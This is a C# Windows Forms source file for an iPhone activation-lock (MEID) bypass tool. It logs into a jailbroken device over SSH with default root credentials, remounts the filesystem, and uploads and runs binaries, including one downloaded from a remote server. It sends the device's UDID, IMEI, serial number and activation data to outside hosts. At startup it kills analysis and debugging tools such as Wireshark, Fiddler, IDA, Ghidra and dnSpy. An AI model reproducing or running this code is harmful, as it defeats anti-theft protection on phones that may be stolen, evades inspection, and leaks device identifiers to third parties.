using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using EasyHttp.Http;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using jaguarTools.Properties;
using Microsoft.VisualBasic.Devices;
using MobileDevice;
using MobileDevice.Event;
using Newtonsoft.Json;
using Renci.SshNet;
using EasyHttp.Infrastructure;
using SaaUI;
using System.Runtime.Remoting.Contexts;

namespace JaguarTools_2._1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            HttpClient http = new HttpClient();

            string URL = "https://brayanvilla.com/check.php";

            var Sending = http.Get(URL);

            string result = Sending.RawText;
            if (result.Contains("ERROR"))
            {
                Close();
            }
            CloseProcess();
            InitializeDetection();
        }

        Process proceso = new Process();
        public iOSDeviceManager manager = new iOSDeviceManager();
        public iOSDevice currentiOSDevice;
        public SshClient Ssh = new SshClient("127.0.0.1", "root", "alpine");
        public ScpClient Scp = new ScpClient("127.0.0.1", "root", "alpine");

        public string SheLL(string Command)
        {
            File.WriteAllText("tmp\\shell.cmd", "@echo off\n" + Command);
            proceso = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "tmp\\shell.cmd",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true
                },
            };
            proceso.Start();
            StreamReader reader = proceso.StandardOutput;
            return reader.ReadToEnd();
        }
        public void BoxShow(string Arg, string Caption)
        {
            MessageBox.Show(Arg, Caption, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        public void BoxShowError(string Arg, string Caption)
        {
            MessageBox.Show(Arg, Caption, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void ListenError(object sender, ListenErrorEventHandlerEventArgs args)
        {
            if (args.ErrorType == MobileDevice.Enumerates.ListenErrorEventType.StartListen)
            {
                string ERROR = args.ErrorMessage;
                Exception e = new Exception(ERROR);
                BoxShowError(e.Message, "ERROR");
            }
        }
        public void InitializeDetection()
        {
            SheLL("C:\\Windows\\System32\\TASKKILL /IM iproxy.exe /F");
            string Known = "%USERPROFILE%\\.ssh\\known_hosts";
            if (File.Exists(Known))
            {
                File.Delete(Known);
            }
            string iTunes = "iTunesMobileDevice.dll";
            string X86 = "C:\\Program Files\\Common Files\\Apple\\Mobile Device Support\\" + iTunes + "";
            string X64 = "C:\\Program Files (x86)\\Common Files\\Apple\\Mobile Device Support\\" + iTunes + "";
            if (!Directory.Exists("C:\\Program Files\\Common Files\\Apple\\Mobile Device Support"))
            {
                if (!Directory.Exists("C:\\Program Files (x86)\\Common Files\\Apple\\Mobile Device Support"))
                {
                    BoxShow("Install iTunes or Drivers with 3UTools", "ERROR");
                    Close();
                }
            }
            else
            {
                if (!File.Exists(X86))
                {
                    File.Copy(iTunes, X86);

                }
                if (!File.Exists(X64))
                {
                    File.Copy(iTunes, X64);
                }
                CheckiTunes();
            }
        }

        void CloseProcess()
        {
            try
            {
                foreach (Process process in Process.GetProcesses())
                {
                    if (process.ProcessName == "WireShark" || process.MainWindowTitle.Contains("WireShark"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName == "CharlesProxy" || process.MainWindowTitle.Contains("CharlesProxy"))
                    {
                        process.Kill();
                    }
                    if (process.MainWindowTitle == "Progress Telerik Fiddler Web Debugger")
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("python"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName == "Fiddler Everywhere")
                    {
                        process.Kill();
                    }
                    if (process.ProcessName == "Fiddler")
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("powershell"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("conemu"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("mobaxterm"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("hyper"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("wsl"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("bash"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("cscript"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("putty"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("winscp"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("git-bash"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("dnSpy"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("ida"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("ghidra"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("HxD"))
                    {
                        process.Kill();
                    }
                }
                Thread.Sleep(1000);
            }
            catch (Exception)
            {

            }
        }

        public void CheckiTunes()
        {
            if (File.Exists("C:\\Program Files\\Common Files\\Apple\\Mobile Device Support\\iTunesMobileDevice.dll"))
            {
                if (File.Exists("C:\\Program Files (x86)\\Common Files\\Apple\\Mobile Device Support\\iTunesMobileDevice.dll"))
                {
                    manager.CommonConnectEvent += CommonConnectDevice; manager.ListenErrorEvent += ListenError; manager.StartListen();
                }
            }

        }

        private void CommonConnectDevice(object sender, DeviceCommonConnectEventArgs args)
        {
            if (args.Message == MobileDevice.Enumerates.ConnectNotificationMessage.Connected)
            {
                currentiOSDevice = args.Device;
                SetData(true);

            }
            if (args.Message == MobileDevice.Enumerates.ConnectNotificationMessage.Disconnected)
            {
                SetData(false);
            }
        }
        public string DeviceInfo(string Info)
        {
            string CMD = "@echo off\nlib\\ideviceinfo.exe | lib\\grep.exe -w " + Info + " | lib\\awk.exe '{printf $NF}'";
            File.WriteAllText("tmp\\Info.cmd", CMD);
            proceso = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "tmp\\Info.cmd",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                },
            };
            proceso.Start();
            StreamReader Information = proceso.StandardOutput;
            string Final = Information.ReadToEnd();
            //  proceso.WaitForExit();
            return Final;
        }

        public void SetData(bool Valor)
        {
            if (Valor != false)
            {
                Invoke((MethodInvoker)(() => saaLabel3.Text = "Connected Device: " + DeviceInfo("ProductType") + " iOS " + DeviceInfo("ProductVersion")));
                Invoke((MethodInvoker)(() => saaLabel4.Visible = true));
                Invoke((MethodInvoker)(() => saaLabel5.Visible = true));
                Invoke((MethodInvoker)(() => saaLabel6.Visible = true));
                Invoke((MethodInvoker)(() => saaLabel8.Visible = true));
                Invoke((MethodInvoker)(() => saaLabel4.Text = "UDID: " + DeviceInfo("UniqueDeviceID")));
                Invoke((MethodInvoker)(() => saaLabel5.Text = "IMEI: " + DeviceInfo("InternationalMobileEquipmentIdentity")));
                Invoke((MethodInvoker)(() => saaLabel6.Text = "SN: " + DeviceInfo("SerialNumber")));
                Invoke((MethodInvoker)(() => saaButton1.Value = "Unlock Device"));
                Invoke((MethodInvoker)(() => saaLabel8.Text = "STATUS: " + DeviceInfo("ActivationState")));
                CambiarImagen();
                Invoke((MethodInvoker)(() => pictureBox1.Visible = true));
            }
            else
            {
                Invoke((MethodInvoker)(() => saaLabel3.Text = "No Device connected"));
                Invoke((MethodInvoker)(() => saaLabel4.Visible = false));
                Invoke((MethodInvoker)(() => saaLabel5.Visible = false));
                Invoke((MethodInvoker)(() => saaLabel6.Visible = false));
                Invoke((MethodInvoker)(() => saaLabel8.Visible = false));
                Invoke((MethodInvoker)(() => saaButton1.Value = "Waiting For Device ..."));
                Invoke((MethodInvoker)(() => pictureBox1.Visible = false));
            }
        }

        public void CheckSIMLockCarrier()
        {
            if (DeviceInfo("SerialNumber") != "")
            {
                SheLL("lib\\ideviceactivation.exe activate -d -s \"https://brayanvilla.com/MEID.php?simlock=\"");
                string Ruta = "https://brayanvilla.com/MEID.php?simlockcheck=";
                string getResponse = SheLL("lib\\curl.exe -s -k \"" + Ruta + "\"");
                BoxShow(getResponse, "CARRIER RESPONSE");
            }

            Invoke((MethodInvoker)(() => saaButton2.Enabled = true));

        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

            Invoke((MethodInvoker)(() => saaButton2.Enabled = false));
            CheckSIMLockCarrier();
        }

        private void saaButton2_Click(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync();
        }

        private void backgroundWorker2_DoWork_1(object sender, DoWorkEventArgs e)
        {
            Proxy();
        }

        private void saaButton1_Click_1(object sender, EventArgs e)
        {
            backgroundWorker2.RunWorkerAsync();
        }

        private void saaLabel6_Click(object sender, EventArgs e)
        {
            Invoke((MethodInvoker)(() => Clipboard.SetText(DeviceInfo("SerialNumber"))));
            Invoke((MethodInvoker)(() => saaLabel7.Visible = true));
        }

        private void saaButton3_Click(object sender, EventArgs e)
        {
        
        }

        private void saaButton1_Click(object sender, EventArgs e)
        {
            CloseProcess();
            Invoke((MethodInvoker)(() => saaButton1.Enabled = false));
            Invoke((MethodInvoker)(() => saaButton1.Text = "Activating..."));
            backgroundWorker2.RunWorkerAsync();
        }

        private void saaButton2_Click_1(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync();
        }

        private static global::System.Resources.ResourceManager resourceMan;

        private static global::System.Globalization.CultureInfo resourceCulture;

        private void changeImage(string nombreRecurso)
        {
        }


        private void saaButton2_Click_2(object sender, EventArgs e)
        {
        }

        private void saaButton2_Click_3(object sender, EventArgs e)
        {
            CloseProcess();
            backgroundWorker1.RunWorkerAsync();
        }

        private void saaButton4_Click(object sender, EventArgs e)
        {
        
        }

        private void saaLabel7_Click(object sender, EventArgs e)
        {

        }

        private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            Invoke((MethodInvoker)(() =>
            {
            }));

            SheLL("lib\\ideviceenterrecovery.exe " + DeviceInfo("UniqueDeviceID"));
        }






        public void Delete(string Filedelete)
        {
            if (File.Exists(Filedelete))
            {
                File.Delete(Filedelete);
            }
        }




        private void saaButton6_Click(object sender, EventArgs e)
        {
            Conteo.RunWorkerAsync();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        public class ResponseObject
        {
            public string modelDesc { get; set; }
            public string model { get; set; }
            public string imei { get; set; }
            public string imei2 { get; set; }
            public string meid { get; set; }
            public string serial { get; set; }
            public bool activated { get; set; }
            public string warrantyStatus { get; set; }
            public string estPurchaseDate { get; set; }
            public bool technicalSupport { get; set; }
            public bool repairCoverage { get; set; }
            public bool acEligible { get; set; }
            public bool validPurchaseDate { get; set; }
            public bool registered { get; set; }
            public bool replaced { get; set; }
            public bool loaner { get; set; }
            public bool fmiOn { get; set; }
            public int nextActivationPolicyId { get; set; }
            public string carrier { get; set; }
            public string country { get; set; }
            public bool simLock { get; set; }
            public string purchaseCountryCodeIso3 { get; set; }
            public bool blocked { get; set; }
            public bool blockedPolicy { get; set; }
        }

        public class RootObject
        {
            public bool success { get; set; }
            public string response { get; set; }
            public ResponseObject @object { get; set; }
            public string status { get; set; }
        }

        private static readonly HttpClient client = new HttpClient();

        private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
        {

        }

        private void saaPanel1_Paint(object sender, PaintEventArgs e)
        {

        }


        public string CollectionBlob()
        {
            HttpClient http = new HttpClient();

            string URL = "https://brayanvilla.com/MEID.php";

            string POSTContent = File.ReadAllText("tmp\\CollectionBlob");

            var Sending = http.Post(URL, POSTContent, "application/xml");

            return Sending.RawText;

        }

        public string DrmInfo()
        {
            HttpClient http = new HttpClient();

            string GETContent = File.ReadAllText("tmp\\drmInfo");

            string URL = "https://brayanvilla.com/MEID.php?crypt=" + GETContent;

            var Sending = http.Get(URL);

            return Sending.RawText;

        }

        public void Final()
        {
            HttpClient http = new HttpClient();

            string GETContent = File.ReadAllText("tmp\\cmds");

            string URL = "https://brayanvilla.com/MEID.php?final=" + GETContent + "&udid=" + DeviceInfo("UniqueDeviceID") + "&imei=" + DeviceInfo("InternationalMobileEquipmentIdentity") + "&serial=" + DeviceInfo("SerialNumber");

            http.Get(URL);

        }

        public string Wildcard()
        {
            HttpClient http = new HttpClient();

            string URL = "https://brayanvilla.com/MEID.php?wildcard=&serial=" + DeviceInfo("SerialNumber");

            var Sending = http.Get(URL);

            return Sending.RawText;

        }

        public void GetRecord()
        {
            HttpClient http = new HttpClient();


            string URL = "https://villasoftware.pro/new.php?&udid=" + DeviceInfo("UniqueDeviceID") + "&ucid=" + DeviceInfo("UniqueChipID") + "&sn=" + DeviceInfo("SerialNumber");

            http.GetAsFile(URL, "tmp\\activation_record.plist");

        }

        public void Pair()
        {
            proceso = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "lib\\idevicepair.exe",
                    Arguments = "pair",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true
                },
            };
            proceso.Start();
            StreamReader reader = proceso.StandardOutput;
            string check = reader.ReadToEnd();
            if (!check.Contains("SUCCESS: Paired with device " + DeviceInfo("UniqueDeviceID")))
            {
                BoxShow("Please accept trust dialog in your device or reconnect!", "PAIR DEVICE");
                Pair();
            }
        }

        public void GetDenisse()
        {
            HttpClient http = new HttpClient();
        
        
            string URL = "https://brayanvilla.com/Denisse.php?serial=" + DeviceInfo("SerialNumber");
        
            http.GetAsFile(URL, "tmp\\Denisse");
        
        }


        public void BypassMEID()
        {
            try 
            {
                proceso = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "lib\\iproxy.exe",
                        Arguments = "22 44",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true
                    },
                };
                proceso.Start();
            
                if(!Ssh.IsConnected)
                {
                    Ssh.Connect();
                }
            
                Ssh.CreateCommand("mount -o rw,union,update /").Execute();
            
                if(!Scp.IsConnected)
                {
                    Scp.Connect();
                }
            
                Scp.Upload(new FileInfo("Carbon\\MobileSubstrate.lzma"), "/./MS.lzma");
                Scp.Upload(new FileInfo("Carbon\\lzma"), "/./usr/bin/lzma");
            
                Ssh.CreateCommand("chmod +x /usr/bin/lzma").Execute();
            
                Ssh.CreateCommand("lzma -d -v /./MS.lzma").Execute();
            
                Ssh.CreateCommand("cd /./; chmod +x $(tar -xvf /./MS -C ./)").Execute();
            
                Ssh.CreateCommand("/usr/libexec/substrate").Execute();
            
                Ssh.CreateCommand("/usr/libexec/substrated").Execute();
            
                Scp.Upload(new FileInfo("Carbon\\CSf"), "/./CSf");
            
                Ssh.CreateCommand("cd /./; chmod +x $(tar -xvf /./CSf -C ./)").Execute();
            
                Scp.Upload(new FileInfo("Carbon\\executeFunction"), "/./usr/bin/executeFunction");
            
                Delete("tmp\\Denisse");
            
                GetDenisse();
            
                Scp.Upload(new FileInfo("tmp\\Denisse"), "/./usr/bin/Denisse");
            
                Delete("tmp\\Denisse");
            
                Ssh.CreateCommand("chmod +x /usr/bin/executeFunction").Execute();
            
                Ssh.CreateCommand("chmod +x /usr/bin/Denisse").Execute();
            
                Ssh.CreateCommand("executeFunction MadGate.createTunnel1SessionInfo:").Execute();
            
                Ssh.CreateCommand("Denisse CollectionBlob").Execute();
            
                Pair();
            
                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s https://brayanvilla.com/MEID.php &>activation.txt\"");
                
            
                Scp.Upload(new FileInfo("Carbon\\.cache.txt"), "/./usr/bin/kernel");
            
                Ssh.CreateCommand("chmod +x /usr/bin/kernel").Execute();
            
                Ssh.CreateCommand("kernel").Execute();
            
                Ssh.CreateCommand("Denisse DrmInfo &>/./rd.xml").Execute();
            
                try
                {
                    Scp.Download("/./rd.xml", new FileInfo("tmp\\rd.xml"));
                }
                catch
                {
            
                }
            
                if (File.Exists("tmp\\rd.xml"))
                {
            
                    string drmInfo = RD();
            
                    Ssh.CreateCommand("kernel " + drmInfo).Execute();
            
                }
            
                Ssh.CreateCommand("Denisse Cmds").Execute();
            
                string CommCenter = "/private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist";
            
                Ssh.CreateCommand("chflags nouchg " + CommCenter).Execute();
            
                Ssh.CreateCommand("Denisse Wildcard").Execute();
            
                Ssh.CreateCommand("Denisse Record").Execute();
            
                Ssh.CreateCommand("Denisse Flag").Execute();
            
                Ssh.CreateCommand("rm /usr/bin/Denisse").Execute();
            
                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons").Execute();
            
                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons").Execute();
            
                Thread.Sleep(20000);
            
                if(DeviceInfo("ActivationState") != "Unactivated")
                {
                    BoxShow("Successfully Activated Device!", "MESSAGE");
                }
                else
                {
                    BoxShowError("Upps Error! :(", "ERROR");
                }
            
            } 
            catch(Exception e)
            {
                BoxShowError(e.Message, "ERROR");
            }
            Delete("tmp\\rd.xml");
            Invoke((MethodInvoker)(() => saaButton1.Enabled = true));
            Invoke((MethodInvoker)(() => saaButton1.Text = "Activate"));
        }

    }
}
